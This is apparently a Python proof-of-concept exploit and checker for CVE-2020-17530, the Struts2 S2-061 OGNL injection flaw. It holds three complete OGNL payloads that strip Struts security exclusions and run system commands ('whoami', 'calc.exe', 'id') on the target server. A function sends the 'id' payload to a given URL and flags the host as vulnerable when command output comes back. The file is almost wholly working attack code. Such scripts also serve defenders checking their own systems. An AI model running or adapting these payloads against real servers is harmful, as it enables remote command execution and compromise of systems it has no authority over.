# coding:utf-8
import requests
import urllib
import random
requests.packages.urllib3.disable_warnings()

class c2Class(object):
	def __init__(self):
		self.vulname = 'S2-061 rce'
		self.cveid='CVE-2020-17530'
		self.vulsystem= 'Struts2'
		self.vulversion = 'Struts 2.0.0 - 2.5.25'
		self.findtime='2020'
		self.refer= 'https://github.com/Al1ex/CVE-2020-17530'
		self.testisok=True

		self.vulparam='id'
		self.payload_whoami= '''%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("whoami")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}''' # ognl
		self.payload_calc= '''%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("calc.exe")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}''' #
		self.payload_id= '''%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}''' # ognl
		self.headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0'}
		self.flag1=200
		self.flag_id='groups='

	def c2Func(self,target):
		status=0
		returnData=''
		if target.startswith(('http://','https://')):
			pass
		else:
			target='http://'+target

		if target.endswith(('.action')):
			url=target+'?'+self.vulparam+'='+self.payload_id
		else:
			url=target+'/index.action'
		try:
			params = {self.vulparam:self.payload_id}
			resp=requests.get(url=url,params=params,headers=self.headers,verify=False)
			if self.flag1 == resp.status_code and self.flag_id in resp.text:
				returnData='%s is bad.The vuln is S2-061 rce (CVE-2020-17530).Vul url is: %s'%(target,resp.url)
				status=1
		except Exception as e:
			returnData=str(e)
		return status,returnData

if __name__ == '__main__':
	target='http://192.168.3.16:8085'
	pocObj=c2Class()
	print(pocObj.c2Func(target))